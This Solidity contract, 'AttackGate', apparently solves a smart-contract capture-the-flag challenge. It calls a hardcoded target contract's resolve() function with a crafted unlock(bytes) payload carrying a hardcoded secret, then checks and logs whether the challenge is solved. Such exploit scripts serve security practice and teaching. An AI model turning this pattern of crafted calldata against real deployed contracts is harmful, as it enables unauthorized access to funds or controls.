// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Define the interface of the target contract
interface ITargetContract {
    function resolve(bytes memory _data) external;
    function isSolved() external returns (bool);
}

contract AttackGate {
    ITargetContract targetContract;
    event Log(address sender, string message);
    constructor() {
        address _targetContractAddress = 0x6Ff5182E700279f8387DCd985EBA85988C9162F8;
        targetContract = ITargetContract(_targetContractAddress);
    }

    function unlock() public {
        bytes32 secret = 0x00000000000000000000000000000000000000007465737490aa7465737490aa;
        bytes memory secretBytes = abi.encodePacked(secret);
        bytes memory data = abi.encodeWithSignature("unlock(bytes)", secretBytes);
        targetContract.resolve(data);
    }
    function isSolved() public {
        if (targetContract.isSolved()) {
            emit Log(msg.sender, "[+] Success." );
        } else {
            emit Log(msg.sender, "[-] Failure.");
        }
        
    }
}